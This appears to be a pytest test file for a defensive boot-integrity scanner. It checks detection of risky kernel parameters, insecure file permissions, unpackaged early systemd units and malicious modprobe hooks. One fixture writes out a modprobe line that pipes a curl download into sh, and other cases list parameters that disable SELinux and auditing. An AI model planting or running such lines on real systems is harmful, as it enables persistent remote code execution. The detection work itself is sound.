"""Early boot inventory: everything that runs before Satsuma is vetted.

Erken açılış envanteri: Satsuma'dan önce çalışan her şey denetlenir.
"""
import stat
from pathlib import Path
from types import SimpleNamespace as NS

import pytest

from satsuma import boot_inventory as bi

ROOT = Path(__file__).parents[1]


@pytest.mark.parametrize('cmdline,flagged', [
    ('BOOT_IMAGE=/vmlinuz root=UUID=x ro rhgb quiet', []),
    ('ro init=/tmp/sh', ['init=/tmp/sh']),
    ('ro selinux=0 audit=0 module.sig_enforce=0', ['selinux=0', 'audit=0', 'module.sig_enforce=0']),
    ('ro audit=1 lockdown=integrity usbcore.authorized_default=2', []),
    ('ro systemd.debug_shell rd.break', ['systemd.debug_shell', 'rd.break']),
])
def test_kernel_cmdline(cmdline, flagged):
    assert [f['item'] for f in bi.cmdline_findings(cmdline)] == flagged


def facts(**kw):
    return {'path': '/x', 'uid': 0, 'mode': 0o644, **kw}


def test_file_problems():
    assert bi.file_problems(facts()) == []
    assert bi.file_problems(facts(uid=1000, mode=0o666)) == ['not_owned_by_root', 'group_or_world_writable']
    assert bi.file_problems(facts(link='/dev/null', link_resolved='/dev/null')) == []
    assert bi.file_problems(facts(link='../../tmp/x', link_resolved='/tmp/x')) == ['link_leaves_system_trees']


def test_modprobe_install_lines_are_found(tmp_path):
    conf = tmp_path / 'modprobe.d' / 'evil.conf'
    conf.parent.mkdir()
    conf.write_text('install dccp /bin/true\ninstall usb_storage /bin/sh -c "curl x|sh"\n# install a /bin/sh\n')
    found = bi.modprobe_commands({str(conf): {'path': str(conf)}})
    assert [f['line'] for f in found] == ['install usb_storage /bin/sh -c "curl x|sh"']


class Host:
    """A fake system: systemctl, rpm and lsinitrd answers plus a file table."""

    def __init__(self, files, packages, changed=''):
        self.files, self.packages, self.changed = files, packages, changed

    def runner(self, args, **kw):
        if args[0].endswith('systemctl') and 'list-dependencies' in args:
            return NS(returncode=0, stdout='systemd-udevd.service\nevil-early.service\n', stderr='')
        if args[0].endswith('systemctl'):
            return NS(returncode=0, stdout=(
                'Id=systemd-udevd.service\nFragmentPath=/usr/lib/systemd/system/systemd-udevd.service\nDropInPaths=\nDefaultDependencies=no\n\n'
                'Id=evil-early.service\nFragmentPath=/etc/systemd/system/evil-early.service\nDropInPaths=\nDefaultDependencies=yes\n\n'
                'Id=late.service\nFragmentPath=/usr/lib/systemd/system/late.service\nDropInPaths=\nDefaultDependencies=yes\n'), stderr='')
        if args[0].endswith('rpm') and args[1] == '-qf':
            name = self.packages.get(args[-1])
            return NS(returncode=0 if name else 1, stdout=(name + '\n') if name else f'file {args[-1]} is not owned by any package\n', stderr='')
        if args[0].endswith('rpm') and args[1] == '-V':
            return NS(returncode=0, stdout=self.changed if args[-1] == 'systemd' else '', stderr='')
        if args[0].endswith('lsinitrd'):
            return NS(returncode=0, stdout='dracut modules:\nsystemd\nusbguard-evil\n' if '-m' in args else
                      '-rwxr-xr-x 1 root root 1 Jan 1 usr/lib/dracut/hooks/pre-pivot/99-x.sh\n', stderr='')
        raise AssertionError(args)

    def lstat(self, path):
        if path not in self.files:
            raise FileNotFoundError(path)
        return NS(st_uid=0, st_mode=stat.S_IFREG | self.files[path])


def test_collect_flags_an_unpackaged_early_unit_and_a_changed_packaged_file():
    files = {'/usr/lib/systemd/system/systemd-udevd.service': 0o644, '/etc/systemd/system/evil-early.service': 0o644}
    host = Host(files, {'/usr/lib/systemd/system/systemd-udevd.service': 'systemd'},
                changed='S.5....T.    /usr/lib/systemd/system/systemd-udevd.service\n')
    report = bi.collect(host.runner, cmdline='ro quiet', lstat=host.lstat, readlink=lambda p: '')
    units = [u['unit'] for u in report['inventory']['early_units']]
    assert units == ['systemd-udevd.service', 'evil-early.service']
    reasons = {(f['item'], f['reason']) for f in report['findings']}
    assert ('/etc/systemd/system/evil-early.service', 'not_packaged') in reasons
    assert ('/usr/lib/systemd/system/systemd-udevd.service', 'package_file_changed') in reasons
    assert report['status'] == 'FINDINGS' and report['trust'] == 'local_rpmdb'
    assert 'usbguard-evil' in report['inventory']['initramfs']['dracut_modules']
    assert any('/hooks/' in h for h in report['inventory']['initramfs']['hooks_and_units'])


def test_clean_host_is_clean():
    files = {'/usr/lib/systemd/system/systemd-udevd.service': 0o644, '/etc/systemd/system/evil-early.service': 0o644}
    host = Host(files, dict.fromkeys(files, 'systemd'))
    report = bi.collect(host.runner, cmdline='ro quiet', lstat=host.lstat, readlink=lambda p: '')
    assert report['status'] == 'CLEAN', report['findings']


def test_service_and_timer_are_packaged_and_started():
    unit = (ROOT / 'systemd/satsuma-boot-inventory.service').read_text()
    assert '-I -B /opt/satsuma-core/main.py --boot-inventory' in unit and 'PrivateTmp=yes' in unit
    timer = (ROOT / 'systemd/satsuma-boot-inventory.timer').read_text()
    assert 'OnBootSec=1min' in timer and 'OnUnitActiveSec=6h' in timer
    spec = (ROOT / 'packaging/satsuma-core.spec').read_text()
    assert any('systemctl enable ' in l and 'satsuma-boot-inventory.timer' in l for l in spec.splitlines())
    assert any('systemctl start ' in l and 'satsuma-boot-inventory.timer' in l for l in spec.splitlines())
